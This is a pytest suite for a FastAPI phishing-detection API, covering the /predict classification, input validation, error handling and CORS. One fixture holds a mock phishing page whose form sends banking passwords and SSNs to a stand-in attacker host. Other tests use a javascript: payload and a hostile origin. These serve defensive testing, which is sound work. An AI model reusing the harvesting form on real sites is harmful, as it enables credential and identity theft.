"""Unit and integration tests for FastAPI REST API endpoints.

Covers:
- GET /health (regression check)
- GET / (API root metadata)
- GET /docs and GET /redoc (OpenAPI documentation endpoints)
- POST /predict with safe, phishing, degraded, invalid, empty, and oversized payloads
- HTTP 422 vs HTTP 200 error distinction per specification
- Internal exception handling (HTTP 500 without stack leaks)
- Singleton model reuse across multiple requests
- CORS middleware verification
"""

import pytest
from unittest.mock import patch
from fastapi.testclient import TestClient

from app.main import app
from app.core.model_loader import ModelLoader


@pytest.fixture(scope="module")
def client():
    """Module-scoped FastAPI test client."""
    with TestClient(app) as test_client:
        yield test_client


def test_health_check(client: TestClient):
    """Test GET /health returns status: ok (Stage 1 regression check)."""
    response = client.get("/health")
    assert response.status_code == 200
    data = response.json()
    assert data == {"status": "ok"}


def test_root_endpoint(client: TestClient):
    """Test GET / returns API metadata, version, and documentation links."""
    response = client.get("/")
    assert response.status_code == 200
    data = response.json()
    assert "name" in data
    assert "version" in data
    assert data.get("status") == "running"
    assert data.get("docs_url") == "/docs"
    assert data.get("redoc_url") == "/redoc"


def test_openapi_docs_endpoints(client: TestClient):
    """Test GET /docs and GET /redoc are reachable and return HTTP 200."""
    docs_res = client.get("/docs")
    assert docs_res.status_code == 200

    redoc_res = client.get("/redoc")
    assert redoc_res.status_code == 200


def test_predict_safe_url_mocked(client: TestClient):
    """Test POST /predict with a clean legitimate URL returns status: safe and HTTP 200."""
    sample_safe_html = """
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <title>Python Documentation - Standard Library Reference</title>
        <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
      </head>
      <body>
        <header>
          <nav>
            <a href="/index.html">Home</a>
            <a href="/tutorial.html">Tutorial</a>
            <a href="/library/index.html">Library</a>
            <a href="/reference/index.html">Reference</a>
            <a href="/whatsnew/index.html">What's New</a>
          </nav>
        </header>
        <main>
          <h1>urllib.parse — Parse URLs into components</h1>
          <p>This module defines a standard interface to break Uniform Resource Locator strings up in components.</p>
          <img src="/static/py.png" alt="Python Logo"/>
          <section>
            <h2>Functions and Classes</h2>
            <ul>
              <li><a href="/library/urllib.parse.html#urlparse">urlparse</a></li>
              <li><a href="/library/urllib.parse.html#urlsplit">urlsplit</a></li>
              <li><a href="/library/urllib.parse.html#urljoin">urljoin</a></li>
              <li><a href="/library/urllib.parse.html#quote">quote</a></li>
              <li><a href="/library/urllib.parse.html#unquote">unquote</a></li>
            </ul>
          </section>
        </main>
        <footer>
          <p>© Python Software Foundation. <a href="/about/legal.html">Legal Notices</a></p>
          <a href="/contact.html">Contact Us</a>
          <a href="/sitemap.html">Site Map</a>
        </footer>
      </body>
    </html>
    """

    with patch(
        "app.services.detection_engine.DetectionEngine.fetch_single_html",
        return_value=(True, sample_safe_html, None, False),
    ):
        payload = {"url": "https://example.org/docs"}
        response = client.post("/predict", json=payload)

        assert response.status_code == 200
        data = response.json()

        assert data["url"] == "https://example.org/docs"
        assert data["status"] == "safe"
        assert data["is_phishing"] is False
        assert data["risk_level"] == "low"
        assert 0.0 <= data["confidence"] <= 0.5
        assert data["html_available"] is True
        assert isinstance(data["detected_indicators"], list)
        assert len(data["detected_indicators"]) > 0
        assert data["error_message"] is None
        assert "analysis_timestamp" in data
        assert isinstance(data["execution_time_ms"], (int, float))

        # Check url_features_summary keys
        summary = data["url_features_summary"]
        assert summary["uses_https"] is True
        assert summary["has_ip_address"] is False
        assert summary["has_suspicious_tld"] is False


def test_predict_phishing_url_mocked(client: TestClient):
    """Test POST /predict with a phishing URL and deceptive HTML returns status: phishing and HTTP 200."""
    sample_phish_html = """
    <!DOCTYPE html>
    <html>
    <head><title>Secure Account Verification</title></head>
    <body>
        <h2>Account Suspended - Action Required</h2>
        <form action="http://evil-attacker.ru/collect.php" method="post">
            <input type="password" name="pwd" placeholder="Enter banking password">
            <input type="text" name="ssn" placeholder="Social Security Number">
            <input type="submit" value="Verify Identity">
        </form>
        <a href="http://evil-attacker.ru/terms">Terms</a>
    </body>
    </html>
    """

    with patch(
        "app.services.detection_engine.DetectionEngine.fetch_single_html",
        return_value=(True, sample_phish_html, None, False),
    ):
        payload = {"url": "http://192.168.1.100/paypal/login.php"}
        response = client.post("/predict", json=payload)

        assert response.status_code == 200
        data = response.json()

        assert data["status"] == "phishing"
        assert data["is_phishing"] is True
        assert data["risk_level"] == "high"
        assert data["confidence"] > 0.5
        assert data["html_available"] is True
        assert data["error_message"] is None
        assert any("IP address" in ind or "login" in ind.lower() or "action" in ind.lower() for ind in data["detected_indicators"])


def test_predict_degraded_mode_on_fetch_timeout(client: TestClient):
    """Test POST /predict gracefully handles fetch timeouts with degraded-mode scoring."""
    with patch(
        "app.services.detection_engine.DetectionEngine.fetch_single_html",
        return_value=(False, None, "Request timed out", False),
    ):
        payload = {"url": "https://www.wikipedia.org/wiki/Phishing"}
        response = client.post("/predict", json=payload)

        assert response.status_code == 200
        data = response.json()

        assert data["html_available"] is False
        assert data["status"] in ("safe", "suspicious")
        assert data["risk_level"] in ("low", "medium")
        assert data["error_message"] is None
        assert any("HTML fetch failed" in ind or "Request timed out" in ind for ind in data["detected_indicators"])


def test_predict_missing_url_field_returns_422(client: TestClient):
    """Test POST /predict with missing url field in JSON body returns HTTP 422."""
    response = client.post("/predict", json={})
    assert response.status_code == 422


def test_predict_non_string_url_returns_422(client: TestClient):
    """Test POST /predict with non-string url returns HTTP 422."""
    response = client.post("/predict", json={"url": 123456})
    assert response.status_code == 422


def test_predict_oversized_url_returns_422(client: TestClient):
    """Test POST /predict with URL exceeding 2048 chars is rejected at Pydantic layer with HTTP 422."""
    oversized_url = "https://example.com/" + "a" * 3000
    response = client.post("/predict", json={"url": oversized_url})
    assert response.status_code == 422


def test_predict_malformed_json_body_returns_422(client: TestClient):
    """Test POST /predict with malformed JSON string returns HTTP 422."""
    response = client.post(
        "/predict",
        content="not valid json {{{",
        headers={"Content-Type": "application/json"},
    )
    assert response.status_code == 422


def test_predict_empty_string_url_returns_200_with_error_body(client: TestClient):
    """Test POST /predict with empty string returns HTTP 200 with status: error in response body."""
    response = client.post("/predict", json={"url": ""})
    assert response.status_code == 200
    data = response.json()

    assert data["status"] == "error"
    assert data["confidence"] == 0.0
    assert data["risk_level"] == "unknown"
    assert data["is_phishing"] is False
    assert data["html_available"] is False
    assert data["error_message"] is not None
    assert "empty" in data["error_message"].lower()


def test_predict_whitespace_string_url_returns_200_with_error_body(client: TestClient):
    """Test POST /predict with whitespace-only string returns HTTP 200 with status: error in body."""
    response = client.post("/predict", json={"url": "   \t  "})
    assert response.status_code == 200
    data = response.json()

    assert data["status"] == "error"
    assert data["error_message"] is not None
    assert "empty or whitespace" in data["error_message"].lower()


def test_predict_unsupported_scheme_returns_200_with_error_body(client: TestClient):
    """Test POST /predict with unsupported scheme (javascript:) returns HTTP 200 with error body."""
    response = client.post("/predict", json={"url": "javascript:alert('test')"})
    assert response.status_code == 200
    data = response.json()

    assert data["status"] == "error"
    assert data["confidence"] == 0.0
    assert data["error_message"] is not None
    assert "Unsupported URL scheme" in data["error_message"]


def test_predict_unexpected_exception_returns_500(client: TestClient):
    """Test unexpected internal exception in engine returns HTTP 500 without leaking details."""
    with patch(
        "app.services.detection_engine.DetectionEngine.analyze_url",
        side_effect=RuntimeError("Secret internal database connection failed"),
    ):
        response = client.post("/predict", json={"url": "https://example.com"})
        assert response.status_code == 500
        data = response.json()
        assert data["detail"] == "An internal server error occurred while analyzing the URL."
        assert "Secret" not in str(data)
        assert "database" not in str(data)


def test_singleton_model_reuse_across_requests(client: TestClient):
    """Test model singleton is loaded once and reused without disk reload across multiple requests."""
    loader = ModelLoader.get_instance()
    initial_count = loader.load_count
    assert initial_count >= 1

    sample_html = "<html><body><p>Hello world</p></body></html>"
    with patch(
        "app.services.detection_engine.DetectionEngine.fetch_single_html",
        return_value=(True, sample_html, None, False),
    ):
        for _ in range(5):
            res = client.post("/predict", json={"url": "https://example.com/test"})
            assert res.status_code == 200

    # Ensure load_count did not increase after repeated inferences
    assert loader.load_count == initial_count


def test_cors_headers(client: TestClient):
    """Test CORS headers are returned for allowed development origins and denied for untrusted origins."""
    # Allowed origin: http://localhost:3000
    response = client.options(
        "/predict",
        headers={
            "Origin": "http://localhost:3000",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type",
        },
    )
    assert response.status_code == 200
    assert "access-control-allow-origin" in response.headers
    assert response.headers["access-control-allow-origin"] == "http://localhost:3000"
    assert "access-control-allow-credentials" not in response.headers

    # Denied untrusted origin: http://evil-phish.com
    untrusted_resp = client.options(
        "/predict",
        headers={
            "Origin": "http://evil-phish.com",
            "Access-Control-Request-Method": "POST",
            "Access-Control-Request-Headers": "Content-Type",
        },
    )
    assert "access-control-allow-origin" not in untrusted_resp.headers


def test_predict_schema_includes_content_rendering_incomplete(client: TestClient):
    """Stage 12/13 regression: verify content_rendering_incomplete field is present in REST JSON."""
    sample_safe_html = "<html><body><h1>Example Domain</h1></body></html>"
    with patch(
        "app.services.detection_engine.DetectionEngine.fetch_single_html",
        return_value=(True, sample_safe_html, None, False),
    ):
        res = client.post("/predict", json={"url": "https://example.com"})
        assert res.status_code == 200
        data = res.json()
        assert "content_rendering_incomplete" in data
        assert isinstance(data["content_rendering_incomplete"], bool)
        assert data["content_rendering_incomplete"] is False


def test_predict_spa_shell_sets_content_rendering_incomplete_true(client: TestClient):
    """Stage 12/13 regression: verify SPA shell detection delivers content_rendering_incomplete=True."""
    spa_shell_html = (
        '<!doctype html><html lang="en"><head><meta charset="utf-8"/><title>App</title>'
        '<link href="/static/css/main.chunk.css" rel="stylesheet"/>'
        '<script defer="defer" src="/static/js/2.chunk.js"></script>'
        '<script defer="defer" src="/static/js/main.chunk.js"></script>'
        '<script defer="defer" src="/static/js/runtime.js"></script></head>'
        '<body><div id="root"></div></body></html>'
    )
    with patch(
        "app.services.detection_engine.DetectionEngine.fetch_single_html",
        return_value=(True, spa_shell_html, None, False),
    ):
        res = client.post("/predict", json={"url": "https://portal.university.edu/dashboard"})
        assert res.status_code == 200
        data = res.json()
        assert data["content_rendering_incomplete"] is True
        assert data["status"] in ("safe", "suspicious")
        assert data["is_phishing"] is False


def test_predict_adversarial_malformed_inputs(client: TestClient):
    """Stage 13 robustness: verify nested JSON, invalid types, and non-JSON content-type are rejected."""
    # Deeply nested object
    res_nested = client.post("/predict", json={"url": {"nested": "value"}})
    assert res_nested.status_code == 422

    # Integer URL
    res_int = client.post("/predict", json={"url": 12345})
    assert res_int.status_code == 422

    # Null URL
    res_null = client.post("/predict", json={"url": None})
    assert res_null.status_code == 422

